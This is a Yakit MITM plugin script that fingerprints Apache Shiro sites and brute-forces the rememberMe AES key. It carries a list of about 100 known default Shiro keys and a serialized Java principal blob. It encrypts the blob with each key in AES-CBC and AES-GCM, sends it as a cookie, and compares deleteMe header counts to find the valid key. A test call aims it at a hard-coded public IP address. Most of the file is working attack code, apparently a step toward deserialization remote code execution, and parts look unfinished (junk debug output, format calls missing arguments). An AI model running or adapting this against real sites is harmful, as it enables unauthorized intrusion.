# mitm plugin template

#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://23.224.197.142:8080/login")
    // results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://10.10.11.10:8070/shiro")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results

    mirrorNewWebsite(results...)
}

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "0AvVhmFLUs0KTA3Kprsdag==",
    "1AvVhdsgUs0FSA3SDFAdag==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "25BsmdYwjnfcWmnhAciDDg==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "3JvYhmBLUs0ETA5Kprsdag==",
    "r0e3c16IdVkouZgk1TKVMg==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "5AvVhmFLUs0KTA3Kprsdag==",
    "6AvVhmFLUs0KTA3Kprsdag==",
    "6NfXkC7YVCV5DASIrEm1Rg==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "cmVtZW1iZXJNZQAAAAAAAA==",
    "7AvVhmFLUs0KTA3Kprsdag==",
    "8AvVhmFLUs0KTA3Kprsdag==",
    "8BvVhmFLUs0KTA3Kprsdag==",
    "9AvVhmFLUs0KTA3Kprsdag==",
    "OUHYQzxQ/W9e/UjiAGu6rg==",
    "a3dvbmcAAAAAAAAAAAAAAA==",
    "aU1pcmFjbGVpTWlyYWNsZQ==",
    "bWljcm9zAAAAAAAAAAAAAA==",
    "bWluZS1hc3NldC1rZXk6QQ==",
    "bXRvbnMAAAAAAAAAAAAAAA==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "wGiHplamyXlVB11UXWol8g==",
    "U3ByaW5nQmxhZGUAAAAAAA==",
    "MTIzNDU2Nzg5MGFiY2RlZg==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "a2VlcE9uR29pbmdBbmRGaQ==",
    "WcfHGU25gNnTxTlmJMeSpw==",
    "OY//C4rhfwNxCQAQCrQQ1Q==",
    "5J7bIJIV0LQSN3c9LPitBQ==",
    "f/SY5TIve5WWzT4aQlABJA==",
    "bya2HkYo57u6fWh5theAWw==",
    "WuB+y2gcHRnY2Lg9+Aqmqg==",
    "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
    "3qDVdLawoIr1xFd6ietnwg==",
    "ZWvohmPdUsAWT3=KpPqda",
    "YI1+nBV//m7ELrIyDHm6DQ==",
    "6Zm+6I2j5Y+R5aS+5ZOlAA==",
    "2A2V+RFLUs+eTA3Kpr+dag==",
    "6ZmI6I2j3Y+R1aSn5BOlAA==",
    "SkZpbmFsQmxhZGUAAAAAAA==",
    "2cVtiE83c4lIrELJwKGJUw==",
    "fsHspZw/92PrS3XrPW+vxw==",
    "XTx6CKLo/SdSgub+OPHSrw==",
    "sHdIjUN6tzhl8xZMG3ULCQ==",
    "O4pdf+7e+mZe8NyxMTPJmQ==",
    "HWrBltGvEZc14h9VpMvZWw==",
    "rPNqM6uKFCyaL10AK51UkQ==",
    "Y1JxNSPXVwMkyvES/kJGeQ==",
    "lT2UvDUmQwewm6mMoiw4Ig==",
    "MPdCMZ9urzEA50JDlDYYDg==",
    "xVmmoltfpb8tTceuT5R7Bw==",
    "c+3hFGPjbgzGdrC+MHgoRQ==",
    "ClLk69oNcA3m+s0jIMIkpg==",
    "Bf7MfkNR0axGGptozrebag==",
    "1tC/xrDYs8ey+sa3emtiYw==",
    "ZmFsYWRvLnh5ei5zaGlybw==",
    "cGhyYWNrY3RmREUhfiMkZA==",
    "IduElDUpDDXE677ZkhhKnQ==",
    "yeAAo1E8BOeAYfBlm4NG9Q==",
    "cGljYXMAAAAAAAAAAAAAAA==",
    "2itfW92XazYRi5ltW0M2yA==",
    "XgGkgqGqYrix9lI6vxcrRw==",
    "ertVhmFLUs0KTA3Kprsdag==",
    "5AvVhmFLUS0ATA4Kprsdag==",
    "s0KTA3mFLUprK4AvVhsdag==",
    "hBlzKg78ajaZuTE0VLzDDg==",
    "9FvVhtFLUs0KnA3Kprsdyg==",
    "d2ViUmVtZW1iZXJNZUtleQ==",
    "yNeUgSzL/CfiWw1GALg6Ag==",
    "NGk/3cQ6F5/UNPRh8LpMIg==",
    "4BvVhmFLUs0KTA3Kprsdag==",
    "MzVeSkYyWTI2OFVLZjRzZg==",
    "CrownKey==a12d/dakdad",
    "empodDEyMwAAAAAAAAAAAA==",
    "A7UzJgh1+EWj5oBFi+mSgw==",
    "YTM0NZomIzI2OTsmIzM0NTueYQ==",
    "c2hpcm9fYmF0aXMzMgAAAA==",
    "i45FVt72K2kLgvFrJtoZRw==",
    "U3BAbW5nQmxhZGUAAAAAAA==",
    "ZnJlc2h6Y24xMjM0NTY3OA==",
    "Jt3C93kMR9D5e8QzwfsiMw==",
    "MTIzNDU2NzgxMjM0NTY3OA==",
    "vXP33AonIp9bFwGl7aT7rA==",
    "V2hhdCBUaGUgSGVsbAAAAA==",
    "Z3h6eWd4enklMjElMjElMjE=",
    "Q01TX0JGTFlLRVlfMjAxOQ==",
    "ZAvph3dsQs0FSL3SDFAdag==",
    "Is9zJ3pzNh2cgTHB4ua3+Q==",
    "NsZXjXVklWPZwOfkvk6kUA==",
    "GAevYnznvgNCURavBhCr1w==",
    "66v1O8keKNV3TTcGPK1wzg==",
    "SDKOLKn2J1j/2BHjeZwAoQ==",
]
data = codec.DecodeHex(`aced0005737200326f72672e6170616368652e736869726f2e7375626a6563742e53696d706c655072696e636970616c436f6c6c656374696f6ea87f5825c6a3084a0300014c000f7265616c6d5072696e636970616c7374000f4c6a6176612f7574696c2f4d61703b78707077010078`)[0]

executingCount = 0
executingCountLock = sync.NewMutex()
add = func() {
    executingCountLock.Lock()
    executingCount += 1
    yakit_status("正在检测Shiro的网站数量", executingCount)
    executingCountLock.Unlock()
}
sub = func() {
    executingCountLock.Lock()
    executingCount -= 1
    if (executingCount < 1) {
        yakit_status("正在检测Shiro的网站数量", "")
    }else{
        yakit_status("正在检测Shiro的网站数量", executingCount)
    }
    executingCountLock.Unlock()
}
// basicCount = func() {

// }
ctx, cancel = context.WithCancel(context.Background())
swg = sync.NewSizedWaitGroup(20)
# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    swg.Add()
    add()
    defer sub()
    defer swg.Done()
    cookieKey = "rememberMe"
    basicCount = 0
    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))[0]
    reqHeader, _ = str.SplitHTTPHeadersAndBodyFromPacket(req)
    host, port, _ = str.ParseStringToHostPort(url)
    if !str.MatchAllOfSubString(reqHeader, "rememberMe=") {
        yakit_output(sprintf("准备发送 shiro 探测请求 for: %v", url))
        rsp, err = freq.FuzzCookie(cookieKey, "{{base64({{rs(10)}})}};").ExecFirst(httpool.context(ctx))
        if err != nil || rsp.Error != nil {
            yakit_output(sprintf("执行失败【%v】: %v & %v"))
            return
        }

        headers, body := str.SplitHTTPHeadersAndBodyFromPacket(rsp.ResponseRaw)
        yakit_output(sprintf("zzzzzzzzzzz %#v",headers))
        basicCountList = re.MustCompile(`re(\w*)Me`).FindAllString(headers, -1)
        yakit_output(sprintf("xxxxxxxxxxxxxxxx %#v",basicCountList))
        // deleteMe 个数
        basicCount = len(basicCountList)
        remeList = re.MustCompile(`re(\w*)Me`).FindAllString(headers, -1)
        yakit_output(sprintf("%#v",remeList))
        if len(remeList) == 0 {
            yakit_output(sprintf("%v 未检测到 shiro", str.HostPort(host, port)))
            return
        }
        if remeList[0] != cookieKey {
            cookieKey = remeList[0]
            // 输入一个肯定错误的 value ，看看返回的 deleteMe 个数
            rsp2, err = freq.FuzzCookie(cookieKey, "{{base64({{rs(10)}})}};").ExecFirst(httpool.context(ctx))
            if err != nil || rsp2.Error != nil {
                yakit_output(sprintf("执行失败【%v】: %v & %v"))
                return
            }
            basicHeaders, _ := str.SplitHTTPHeadersAndBodyFromPacket(rsp2.ResponseRaw)
            yakit_output(basicHeaders)
            basicCountList = re.MustCompile(`re(\w*)Me`).FindAllString(basicHeaders, -1)
            yakit_output(sprintf("%#v",basicCount))
            // deleteMe 个数
            basicCount = len(basicCountList)
        }
    }
    yakit_output(sprintf("%v 检测到 shiro", str.HostPort(host, port)))
    yakit_output("Shiro Use :"+ cookieKey)
    yakit_output(sprintf("Shiro basicCount : %d", basicCount))
    // yakit_status("Shiro:"+str.HostPort(host, port)+ "\nShiro Use :"+ cookieKey+sprintf("\nShiro basicCount : %d", basicCount), "Shiro 指纹" )
    yakit_status(sprintf("Shiro target: %s\nShiro cookieKey: %s\nShiro basicCount : %d",str.HostPort(host, port),cookieKey,basicCount) ,"Shiro 指纹" )
    cookie = make([]var)
    for _, key := range keys {
        for _, encItem = range [
            {"name": "aes-cbc", "handle": codec.AESCBCEncrypt}, 
            {"name": "aes-gcm", "handle": codec.AESGCMEncrypt},
        ] {
            enc = encItem.handle
            keyDecoded = codec.DecodeBase64(key)[0]
            result = enc(keyDecoded, data, nil)[0]
            if result == nil {
                continue
            }

            cookie = append(cookie, {
                "cookie": codec.EncodeBase64(append(keyDecoded, result...)),
                "key": key,
                "aes-mode": encItem.name,
            })
        }
    }
    for _, cookieElement := range cookie {
        yakit_output(cookieElement["cookie"])
        result = freq.FuzzCookie(cookieKey, cookieElement["cookie"]).ExecFirst()[0]
        if result == nil||result.Error != nil {
            continue
        }
        headers, _ = str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
        currCountList = re.MustCompile(`re(\w*)Me`).FindAllString(headers, -1)
        yakit_output(sprintf("Shiro basicCxxxxxxount : %#v", headers))
        if headers == "" {
            continue
        }
        if basicCount - 1 != len(currCountList) {
            continue
        }else{
            
            yakit_output({
                "shiro_key": cookieElement["key"],
                "cookie_key": cookieKey,
                "url": url,
                "name": "发现漏洞！",
            })
            return
        }
    }
}

clear = func() {
    cancel()
}
